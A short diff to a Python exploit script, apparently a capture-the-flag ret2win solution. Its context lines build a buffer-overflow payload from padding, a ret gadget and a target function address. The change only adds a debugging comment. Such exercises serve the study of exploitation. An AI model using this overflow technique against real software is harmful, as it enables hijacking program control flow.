@@ -44,6 +44,8 @@ def exploit(binary_path):
         payload = b'\x69' * offset
         payload += p64(ret)
         payload += p64(ret2win_addr)
+        
+        # Print the payload in hexadecimal representation for debugging purposes
         log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
 
         # Send the payload and print the output
